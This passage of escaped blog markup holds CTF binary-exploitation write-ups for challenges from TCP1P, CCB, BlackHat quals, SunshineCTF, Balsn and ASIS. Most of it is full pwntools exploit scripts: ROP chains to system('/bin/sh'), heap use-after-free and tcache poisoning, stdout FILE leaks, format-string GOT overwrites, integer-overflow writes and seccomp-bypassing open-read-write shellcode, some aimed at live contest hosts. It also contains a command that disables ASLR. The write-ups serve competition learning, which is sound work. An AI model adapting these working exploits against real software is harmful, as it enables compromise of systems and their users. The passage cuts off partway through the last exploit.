and one thing to mention,if you just use &lt;code&gt;libc_addr+libc.sym[b&amp;quot;system&amp;quot;]&lt;/code&gt; as the addr of &lt;code&gt;system&lt;/code&gt;, you probably can&#39;t get shell at last, I guess maybe it&#39;s because stack alighment problem, so we just add &lt;code&gt;0x1b&lt;/code&gt; as offset to call &lt;code&gt;do_system&lt;/code&gt; directly&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;0x7ffff7c50d7b &amp;lt;system+27&amp;gt;    call   do_system                &amp;lt;do_system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;disturbing when it doesn&#39;t provide any info about the libc&lt;br&gt;
however we can just leak from remote and infer&lt;/p&gt;
&lt;p&gt;and I just use the following when debugging, it&#39;s annoying to meet the 1/16 when dealing with the aslr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo su
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./gamechanger&amp;quot;)
# io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,9254)
elf=ELF(&amp;quot;./gamechanger&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc=elf.libc

io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

io.recvuntil(b&amp;quot;100\n&amp;quot;)
now = int((time.time()))
cs.srand(now)
io.sendline(str((cs.rand()+0x22)%0x17))

# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x104)+b&amp;quot;nmsl&amp;quot;+b&amp;quot;\x10\x51&amp;quot;
io.send(payload)

io.recvuntil(b&amp;quot;nmsl&amp;quot;)
base_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1110
pop_rbp=base_addr+0x11e3
ret=base_addr+0x1016
read_text=base_addr+0x1060
leave_ret=base_addr+0x1358
puts_plt=base_addr+elf.plt[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))


##############


io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

io.recvuntil(b&amp;quot;100\n&amp;quot;)
now = int((time.time()))
cs.srand(now)
io.sendline(str((cs.rand()+0x22)%0x17))

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x108)+p64(base_addr+elf.sym[b&amp;quot;puts&amp;quot;])+p64(base_addr+0x135a)
io.send(payload)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x620d0
print(&amp;quot;leak_addr: &amp;quot; +hex(leak_addr))

shell=leak_addr+0xebdb3
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

####### 
# io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

# io.recvuntil(b&amp;quot;100\n&amp;quot;)
# now = int((time.time()))
# cs.srand(now)
# io.sendline(str((cs.rand()+0x22)%0x17))


# io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x108)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr+0x1b)
io.send(payload)



io.interactive()

# 0x000000000002a3e5 : pop rdi ; ret                                                                         


# 0x00000000000011e3: pop rbp; ret; 
# 0x0000000000001016: ret; 
# 0x0000000000001358: leave; ret; 


# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;unsafe&#34;&gt;unsafe:&lt;/h4&gt;
&lt;p&gt;int-overflow to bypass the random check&lt;br&gt;
no check for the minus in  &lt;code&gt;deposit&lt;/code&gt; func&lt;br&gt;
so there is OOB write , the second input in this func is to do plus or minus with the value on that addr based on the offset of the variable &lt;code&gt;safes&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./unsafe&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,1477)
elf=ELF(&amp;quot;./unsafe&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc=elf.libc


idx=((1&amp;lt;&amp;lt;31)+0x1)-1&amp;lt;&amp;lt;32
io.sendlineafter(b&amp;quot;age: &amp;quot;,str(idx))
io.sendlineafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;\x00\x00\x00\x00&amp;quot;)

now = int((time.time()))

cs.srand(0)

io.sendlineafter(b&amp;quot;password: \n&amp;quot;,str(cs.rand()))

# gdb.attach(io)
# pause()

### make /bin/sh
io.sendlineafter(b&amp;quot;): \n&amp;quot;,str(0))
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(0x3b6873))

### exit_message to str_sh
io.sendlineafter(b&amp;quot;): \n&amp;quot;,str(0x64))
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(0x2058))

### puts to system
io.sendlineafter(b&amp;quot;): \n&amp;quot;,b&amp;quot;-12&amp;quot;)
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(-0x291e0))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC:&lt;/h3&gt;
&lt;h4 id=&#34;sanity-check&#34;&gt;Sanity Check:&lt;/h4&gt;
&lt;p&gt;discord server bot&#39;s sign was the flag&lt;/p&gt;
&lt;h4 id=&#34;guess-my-number&#34;&gt;Guess my number:&lt;/h4&gt;
&lt;p&gt;baisc script writing with pwntools and ctypes&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *

# io=process(&amp;quot;./guess&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,7331)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

cs.srand(0x539)

key=0xcafebabe ^ (cs.rand() + 0x1467f3)

io.sendlineafter(&amp;quot;Guess : &amp;quot;,str(key))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">TCP1P</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/cMQySKj3Y/"" data-c="
          &lt;h3 id=&#34;ccb_veh&#34;&gt;ccb_veh&lt;/h3&gt;
&lt;p&gt;堆风水&lt;br&gt;
2.31开沙盒禁用execve UAF,指针保留最后一次分配的堆块指针&lt;br&gt;
所以我们创建2个大小不同的堆块分别实现泄露libc和栈地址，ret地址写orw 第一个堆块可以重复释放，修改低字节打&lt;code&gt;stdout&lt;/code&gt;，半个字节1/16概率&lt;code&gt;stdout&lt;/code&gt;泄露libc和栈地址&lt;br&gt;
然后第二个堆块负责劫持ret地址，这里劫持的是退出主函数的ret 将ret地址写orw即可 （最开始打hook的时候多创建了一个堆块，删掉也可以&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./veh&amp;quot;)
io=remote(&amp;quot;47.104.16.93&amp;quot;,4551)
elf=ELF(&amp;quot;./veh&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(n))
    
def edit(cc):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;contents:\n&amp;quot;,cc)
    
def delete():
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)


# gdb.attach(io)
# pause()    

stdout=libc.sym[b&amp;quot;_IO_2_1_stdout_&amp;quot;]
print(&amp;quot;stdout: &amp;quot;,hex(stdout))

add(0x100)
delete()

add(0x90)
add(0x90)
add(0x90)
delete()
edit(b&amp;quot;gap&amp;quot;)

for i in range(3):
    add(0x150)  
    
delete()


add(0x100)
delete()
for i in range(7):
    edit(p64(0)*2)
    delete()

edit(b&amp;quot;\xa0\x26&amp;quot;)

add(0x100)
add(0x100)
edit(p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1ec980
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]

edit(p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x100

pop_rdi=leak_addr+0x23b6a
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92


#open
orw=b&amp;quot;./flag\x00\x00&amp;quot;+p64(pop_rdi)+p64(ret_addr-8)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rdx)+p64(0x50)+p64(write_a)


add(0x150)
delete()
for i in range(7):
    edit(p64(0)*2)
    delete()
    
    
# gdb.attach(io)
# pause()    


edit(p64(ret_addr-8))
add(0x150)
add(0x150)
edit(orw)

io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
# add(0x90)
# delete()
# for i in range(3):
#     edit(p64(0)*2)
#     delete()
    
# edit(p64(malloc_hook))
# add(0x90)
# add(0x90)
# edit(p64(ret_addr+8))
# gdb.attach(io)
# pause()    



# payload=p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8)
# payload=payload.ljust(147,b&amp;quot;\x00&amp;quot;)+p64(free_hook)
# edit(payload)

# add(0x100)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ccb_chal&#34;&gt;ccb_chal&lt;/h3&gt;
&lt;p&gt;这道题赛场环境我只能hh了&lt;br&gt;
本质上利用uaf改值进入&lt;code&gt;game2()&lt;/code&gt;，然后打shellcode&lt;br&gt;
开了沙盒,用&lt;code&gt;openat,pread,writev&lt;/code&gt;绕就完了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chal&amp;quot;)
# io=remote(&amp;quot;47.94.205.47&amp;quot;,29706)

def add(n,s):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;idx:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;much:\n&amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;one:\n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;one:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;is at &amp;quot;)
age_addr=int(io.recvuntil(b&amp;quot;,&amp;quot;,drop=True),16)
print(&amp;quot;age_addr : &amp;quot;,hex(age_addr))

add(1,0x70)
add(0,0x70)
delete(1)
# edit(1,p64(0)*2)
delete(0)
# edit(0,p64(0)*2)

edit(0,p64(age_addr))

add(2,0x70)
add(3,0x70)
edit(3,str(0x100))

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;4&amp;quot;)

io.recvuntil(b&amp;quot;me?\n&amp;quot;)


payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi, 0xffffff9c; mov rsi,rsp; xor rdx,rdx; mov rax,257;syscall;&#39;) #openat flag
# payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi,rsp; xor rsi,rsi; xor rdx,rdx; mov rax,2;syscall;&#39;) #open flag
payload += asm(shellcraft.pread(3,0x10500,0x100,0))
payload += asm(shellcraft.writev(1,0x10100,1))
payload = payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+flat(0x10500,0x100)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;blackhat_qual_profile&#34;&gt;blackhat_qual_profile:&lt;/h3&gt;
&lt;p&gt;整数溢出导致的任意地址写，&lt;code&gt;partial relro&lt;/code&gt;可写got表&lt;br&gt;
手动构造一个格式化字符串漏洞泄露地址最后打one_gadget&lt;br&gt;
注意构造顺序和发送细节&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./profile&amp;quot;)
# io=remote(&amp;quot;54.78.163.105&amp;quot;,31321)
elf=ELF(&amp;quot;./profile&amp;quot;)
libc=elf.libc

# gdb.attach(io)
# pause()

# exit_g=0x404068
# free_g=0x404018
exit_g=elf.plt[b&amp;quot;exit&amp;quot;]


### free to main
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\x8c\x13\x40&amp;quot;)
# io.sendlineafter(b&amp;quot;Name: &amp;quot;,p64(0x40138c)[:-1])


### exit to _start
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040406800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\xb0\x11\x40&amp;quot;)

### free to print
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\x20\x11\x40&amp;quot;)


### leak
io.recvuntil(b&amp;quot;Age: &amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;%11$p&amp;quot;)
io.recvuntil(b&amp;quot;0x&amp;quot;)
leak_addr=int(io.recv(12),16)-0x29d90
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0x50a37

### free to one_gadget
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,p64(sys_addr))


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;sunshine_flock&#34;&gt;sunshine_flock:&lt;/h3&gt;
&lt;p&gt;套娃函数，每次退回上一层函数时判断ret地址值是否对应，得注意一下布栈&lt;br&gt;
退到某一层发现了栈上已经写好了接下来的顺序&lt;br&gt;
最后根据偏移将对应返回地址处改为后门函数地址getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./flock&amp;quot;)
io=remote(&amp;quot;chal.2023.sunshinectf.games&amp;quot;,23002)
elf=ELF(&amp;quot;./flock&amp;quot;)

# gdb.attach(io.pid)
# pause()

win=0x4011bd

io.recvuntil(b&amp;quot;At &amp;quot;)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;)
payload=p64(0x4012a0)+p64(stack_addr+0x98)
payload=payload.ljust(0x80,b&amp;quot;a&amp;quot;)
payload+=p64(stack_addr+0xa0)+p64(0x401276)+p64(0x4012a0)*2
payload+=p64(stack_addr+0xc0)+p64(0x4012a0)
payload+=p64(0x402048)+p64(0x4012ca)
payload+=p64(stack_addr+0xe0)+p64(0x4012ca)
payload+=p64(0)+p64(0x4012f0)
payload+=p64(stack_addr+0xe0+0x10)+p64(0x4012f0)
payload+=p64(stack_addr+0xe0+0x20)+p64(win)


# payload+=p64(0x4012a0)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;balsn_babypwn2023&#34;&gt;balsn_babypwn2023:&lt;/h3&gt;
&lt;p&gt;此题3种解法&lt;br&gt;
标准解法是栈迁移&lt;br&gt;
两种非预期一种是&lt;code&gt;XNUCA2018_gets&lt;/code&gt;爆one_gadget&lt;br&gt;
另外一种是利用再次读入时读的时lock_file的IO结构体上存在地址，可以泄露&lt;br&gt;
不过值得注意的是这种方式泄露出的地址会根据内核版本有所不同，因为泄露的地址不在libc上&lt;br&gt;
我的WSL2的ubuntu恰好跟docker里面提供的一样，最后的偏移也一样&lt;br&gt;
同样glibc patch之后的ubuntu虚拟机偏移就有所不同了，这种解法运气成份偏多&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chall&amp;quot;)
# io=remote(&amp;quot;babypwn2023.balsnctf.com&amp;quot;,10105)
elf=ELF(&amp;quot;./chall&amp;quot;)
libc=elf.libc
# libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(elf.plt[b&amp;quot;gets&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(elf.sym[b&amp;quot;main&amp;quot;])
io.sendline(payload)

payload=p64(0)*2+p32(0xdeadbeef)+b&amp;quot;\x00\x00\x00&amp;quot;
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3b8740
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi; ret&amp;quot;)))
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=cyclic(0x28)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;asis_2023_hipwn&#34;&gt;asis_2023_hipwn:&lt;/h3&gt;
&lt;p&gt;保护全开，此题最开始尝试利用ssp leak,劫持 &lt;code&gt;__libc_argv[0]&lt;/code&gt; 打印出flag,但是glibc版本太高已经修复了这个利用&lt;br&gt;
进而考虑正常leak，利用puts任意地址泄露，leak出canary和libc即可正常rop&lt;br&gt;
(不知道给的任意地址写 &lt;code&gt;\x00&lt;/code&gt; 有啥用&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall_p&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)
io=remote(&amp;quot;45.153.243.57&amp;quot;,1337)
# elf=ELF(&amp;quot;./chall&amp;quot;)

# gdb.attach(io)
# pause()

# def zr(i):
#   io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x48+i))
#    io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;)
#    io.recvuntil(b&amp;quot;?\n&amp;quot;)
#    io.sendline(str(0x539))
# for i in range(8):
#    zr(i)
# gdb.attach(io)
# pause()

#1
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x300))
io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;*0x48+b&amp;quot;.&amp;quot;)
io.recvuntil(b&amp;quot;.&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(str(0x539))
# gdb.attach(io)
# pause()

#2
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x400))
io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;*0xf8)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-128-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]

print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
pop_rdi=leak_addr+0x2a3e5
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
ret=leak_addr+0xf8098
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(str(0x539))

#3
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x400))
io.sendafter(b&amp;quot;content\n&amp;quot;,cyclic(0x48)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr))
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;asis_2023_text_editor&#34;&gt;asis_2023_text_editor:&lt;/h3&gt;
&lt;p&gt;主函数给了3个函数， &lt;code&gt;edit_text,save_text,show_error&lt;/code&gt;&lt;br&gt;
&lt;code&gt;edit_text&lt;/code&gt; 将用户输入存入text地址处&lt;br&gt;
&lt;code&gt;save_text&lt;/code&gt;将用户刚才输入的内容写入栈上&lt;br&gt;
&lt;code&gt;show_error&lt;/code&gt; 存在格式化字符串漏洞，可以打印距离text一段固定偏移处(0x100)的值指向的内容&lt;br&gt;
可以利用 &lt;code&gt;edit_text&lt;/code&gt; 和 &lt;code&gt;show_error&lt;/code&gt; 泄露出libc和canary(后者其实没必要&lt;br&gt;
之后利用格式化字符串漏洞劫持 &lt;code&gt;show_error&lt;/code&gt; 的ret地址，one_gadget此题爆不了&lt;br&gt;
可以 &lt;code&gt;ret+0x8,ret+0x10,ret+0x18&lt;/code&gt; 写rop，最后一次劫持到ret上触发rop即可&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)

io=remote(&amp;quot;45.153.243.57&amp;quot;,13337)
elf=ELF(&amp;quot;./chall&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def edit(cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;text: &amp;quot;,cc)

def save():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

def exit():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

def pf():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    
# gdb.attach(io)
# pause()

#leak libc_addr
payload=b&amp;quot;\x00&amp;quot;*0x100+b&amp;quot;\x40\x81&amp;quot;
edit(payload)
save()
pf()

sleep(1)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x21a780
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
pop_rdi=leak_addr+0x2a3e5
pop_rsp=leak_addr+0x35732
ret=leak_addr+0xf8098
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]


#leak stack_addr
payload=b&amp;quot;\x00&amp;quot;*0x100+p64(environ)
edit(payload)
save()
pf()

sleep(1)


stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))
begin_addr=stack_addr-0x238
print(&amp;quot;begin_addr: &amp;quot;,hex(begin_addr))
ret_addr=begin_addr+0x118
print(&amp;quot;ret_addr: &amp;quot;,hex(ret_addr))
canary_addr=stack_addr-0x130
print(&amp;quot;canary_addr: &amp;quot;,hex(canary_addr))


#leak canary
payload=b&amp;quot;\x00&amp;quot;*0x100+p64(canary_addr+1)
edit(payload)
save()
pf()

sleep(1)

